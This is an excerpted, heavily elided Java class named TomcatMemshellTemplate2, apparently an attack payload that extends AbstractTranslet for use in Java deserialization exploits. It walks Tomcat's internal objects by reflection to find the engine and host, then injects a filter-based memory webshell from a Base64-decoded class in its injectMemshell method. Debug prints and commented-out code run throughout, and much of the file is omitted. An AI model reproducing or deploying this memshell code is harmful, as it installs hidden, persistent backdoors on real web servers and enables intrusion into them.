...
public class TomcatMemshellTemplate2 extends AbstractTranslet {
    ...
    public static void main(String[] args) {
        TomcatMemshellTemplate2 tomcatMemshellTemplate2 = new TomcatMemshellTemplate2();
        System.out.println(tomcatMemshellTemplate2);
    }
    ...
    public TomcatMemshellTemplate2(){
        try{
            ...
            Object object = getFV(var5[1], "target");
            System.out.println(object);
//            object = getFV(getFV(getFV(object, "this$0"), "handler"), "global");
//            List o = (List)getFV(object, "processors");
//            for (int i = 0; i < o.size(); i++) {
//                System.out.println(getFV(o, "req"));
//            }
            System.out.println("\n");
            for(int var6 = 0; var6 < var5.length; ++var6) {
                ...
                if (var7 != null) {
                    ...
                    if (!var3.contains("exec")) {
                        Object var1 = getFV(var7, "target");
                        System.out.println(var6+":"+var3+"::"+var1);
...
//
//                                Object req = getFV(next, "req");
//                                Object serverPort = getFV(req, "serverPort");
...
//                                this.serverName = (String) getFV(serverNameMB, "strValue");
...
//                                return;
//                            }
                            System.out.println(var6+":var9:"+var9);
                            for(int var10 = 0; var10 < var9.size(); ++var10) {
                                Object var11 = var9.get(var10);
                                System.out.println(var6+":"+var3+":"+var10+":"+var11);
                                var1 = getFV(var11, "req");
                                Object serverPort = getFV(var1, "serverPort");
                                if (serverPort.equals(-1)){continue;}
...
//        try {
//            threads = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
...
//                    try {
//                        jioEndPoint = getFV(target, "this$0");
//                    }catch (Exception e){}
//                    if (jioEndPoint == null){
//                        try{
//                            jioEndPoint = getFV(target, "endpoint");
//                        }catch (Exception e){ return; }
//                    }
//                    Object service = getFV(getFV(getFV(getFV(getFV(jioEndPoint, "handler"), "proto"), "adapter"), "connector"), "service");
//                    StandardEngine engine = null;
//                    try {
//                        engine = (StandardEngine) getFV(service, "container");
//                    }catch (Exception e){}
//                    if (engine == null){
//                        engine = (StandardEngine) getFV(service, "engine");
//                    }
//
//                    children = (HashMap) getFV(engine, "children");
//                    StandardHost standardHost = (StandardHost) children.get(this.serverName);
//
//                    children = (HashMap) getFV(standardHost, "children");
...
//    }
    ...
    public static void injectMemshell(Object var1) throws Exception {
        ...
        System.out.println("map.get(filterName):"+map.get(filterName));
        if(map.get(filterName) == null) {
            ...
            try{
                ...
                System.out.println(new String(Base64.decode(codeClass)));
